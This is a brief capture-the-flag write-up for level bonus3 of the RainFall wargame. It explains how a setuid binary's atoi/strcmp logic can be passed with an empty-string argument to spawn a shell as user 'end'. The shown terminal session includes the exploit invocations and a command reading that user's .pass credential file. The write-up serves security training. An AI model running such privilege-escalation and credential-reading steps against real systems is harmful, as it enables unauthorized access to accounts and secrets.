the program reads the .pass file for next level into buffer B,
argv[1] is required otherwise it exits
then the program calls atoi() with argv[1] as a parameter and the resulting int is used as an index for buffer B, at that index the program inserts a null byte

afterwards the program compares buffer B to argv[1] via strcmp and if they match it executes /bin/sh

seems like the only way to pass this level is to provide the program with a null byte or an empty string as an argv[1] parameter:


    bonus3@RainFall:~$ ./bonus3 ''
    $ whoami
    end
    $ 
    bonus3@RainFall:~$ ./bonus3 ""
    $ whoami
    end
    $ 
    bonus3@RainFall:~$ ./bonus3 $'\0'
    $ whoami
    end
    $ cat /home/user/end/.pass
